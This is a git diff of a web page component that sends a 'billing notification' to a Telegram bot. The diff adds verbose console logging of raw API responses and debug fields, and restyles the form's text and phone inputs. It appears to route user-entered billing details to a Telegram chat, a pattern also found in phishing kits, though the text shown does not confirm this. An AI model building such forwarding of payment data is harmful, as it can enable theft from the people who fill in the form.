@@ -236,15 +236,20 @@ export default function Home() {
             });
             
             console.log('[index.js] Telegram API response status:', telegramResponse.status, telegramResponse.statusText);
+            console.log('[index.js] Response headers:', Object.fromEntries(telegramResponse.headers.entries()));
             
-            if (!telegramResponse.ok) {
-              console.error('[index.js] Telegram API error response:', {
-                status: telegramResponse.status,
-                statusText: telegramResponse.statusText
-              });
+            let telegramData;
+            const responseText = await telegramResponse.text();
+            console.log('[index.js] Raw response text:', responseText);
+            
+            try {
+              telegramData = JSON.parse(responseText);
+            } catch (parseError) {
+              console.error('[index.js] ❌ Failed to parse Telegram response as JSON:', parseError);
+              console.error('[index.js] Response text:', responseText);
+              throw new Error(`Failed to parse Telegram response: ${parseError.message}`);
             }
             
-            const telegramData = await telegramResponse.json();
             console.log('[index.js] Full Telegram API response data:', JSON.stringify(telegramData, null, 2));
             
             if (telegramData.success) {
@@ -256,9 +261,16 @@ export default function Home() {
               console.error('[index.js] Error details:', {
                 warning: telegramData.warning,
                 message: telegramData.message,
-                error: telegramData.error
+                error: telegramData.error,
+                errorName: telegramData.errorName,
+                debug: telegramData.debug
               });
               console.error('[index.js] Check server logs for details. Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in environment variables.');
+              
+              // Show alert to user if Telegram failed (for debugging)
+              if (telegramData.warning === 'Telegram not configured') {
+                console.error('[index.js] ⚠️ TELEGRAM NOT CONFIGURED - Check environment variables!');
+              }
             }
           } catch (telegramError) {
             console.error('[index.js] ❌ Telegram billing notification network error:', telegramError);
@@ -427,8 +439,8 @@ export default function Home() {
           font-weight: 400;
           color: #1d2329;
           background: #ffffff;
-          border: 1px solid #1d2329;
-          border-radius: 3px;
+          border: 1px solid #d1d1d1;
+          border-radius: 6px;
           transition: all 0.2s ease;
           outline: none;
           line-height: 1.5;
@@ -436,8 +448,8 @@ export default function Home() {
 
         input[type="text"]:focus,
         input[type="tel"]:focus {
-          border-color: #1d2329;
-          box-shadow: 0 0 0 2px rgba(29, 35, 41, 0.1);
+          border-color: #999999;
+          box-shadow: 0 0 0 2px rgba(153, 153, 153, 0.1);
         }
 
         input::placeholder {
